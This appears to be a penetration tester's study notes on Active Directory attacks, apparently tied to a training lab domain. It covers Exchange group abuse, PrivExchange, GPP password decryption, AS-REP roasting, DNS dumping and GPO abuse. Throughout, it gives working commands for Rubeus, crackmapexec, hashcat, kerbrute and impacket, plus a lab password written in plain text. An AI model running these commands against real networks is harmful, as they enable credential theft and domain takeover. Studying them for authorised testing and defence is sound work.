---
tags: [ad, windows, ad-attack, impacket]
aliases: [Misc Attacks]
---
# Exchange Related Group Membership

A default installation of Microsoft Exchange within an AD opens up attack vectors since Exchange is given elevated privileges within the domain. The group `Exchange Windows Permissions` is not listed as a protected group but member are granted the ability to write a DACL to the domain object. We can therefore give ourselves DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. Some techniques to leverage this are detailed [here](https://github.com/gdedrouas/Exchange-AD-Privesc). 

`Organization Management` is a group that can access the mailboxes of all domain users. Has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`

# PrivExchange

A flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP. The Exchange service runs as SYSTEM, we can thus relay to LDAP and dump the domain NTDS database. If we cannot relay we can authenticate to other hosts within the domain.

# Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These might be stored in plaintext. Otherwise some applications may have a test connection function that we can use to gather credentials by changing the LDAP IP address. We may require a full LDAP server, as detailed [here](https://grimhacker.com/2018/03/09/just-a-printer/).

# Enumerating DNS Records

Using a valid domain user account we can enumerate all DNS records. We can thus resolve all records in the zone via this tool.

```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

# view the output
head records.csv

# resolve unknown records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

# Other
### Password in Description Field

Some sensitive information may be found in the user account description or notes field.

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD Field

If this field is set in the userAccountControl attribute the user is not subject to the current password policy length. They may have shorter passwords or no password at all (if the domain allows).

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SMB Shares and SYSVOL Scripts

SYSVOL shares usually contain a lot of sensitive information and it is readable by all authenticated users in the domain. 

### Group Policy Preferences (GPP) Passwords

Applies preferred settings that can often be changed later by the user or local admin, depending on how they are configured.

When GPP is created, a .xml file is created in the SYSVOL share, these files include:
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

The `cpassword` attribute value is AES-256 bit encrypted but the AES private key is published on MSDN, which can be used to decrypt the password. 

We may also find passwords in file such as Registry.xml when autologon is configured via Group Policy. 

> GPP Passwords are usually defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. 

```shell
# decrypting the password
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# locating and retrieving GPP passwords
crackmapexec smb -L | grep gpp

# hunt for gpp autologon files
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

### ASREPRoasting

We can obtain Ticket Granting Tickets (TGT) for any account has the Do not require Kerberos pre-authentication setting enabled. The authentication service reply (AS_REP) is encrypted with the account's password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.

If we have `GenericWrite` or `GenericAll` permissions over an account, we can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password.

```powershell
# enumerating for DONT_REQ_PREAUTH value
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# retrieve AS-REP
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# crack the hash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

# retrieving the AS-REP using kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

# impacket
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

### Group Policy Object (GPO) Abuse

Group Policy provides administrator with many advanced settings that can be applied to both user and computer objects in an AD environment. If we gain rights over a GPO via an ACL misconfiguration, we could leverage this for:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

```powershell
# enumerate GPO names with PowerView
Get-DomainGPO |select displayname

# built-in cmdlet
Get-GPO -All | Select DisplayName

# enumerating domain user GPO rights
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# convert GPO GUID to name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

```

## Related

- [[credential-enumeration]]
- [[reconnaissance|AD Reconnaissance]]
- [[kerberoasting]]
- [[dns-attacks]]

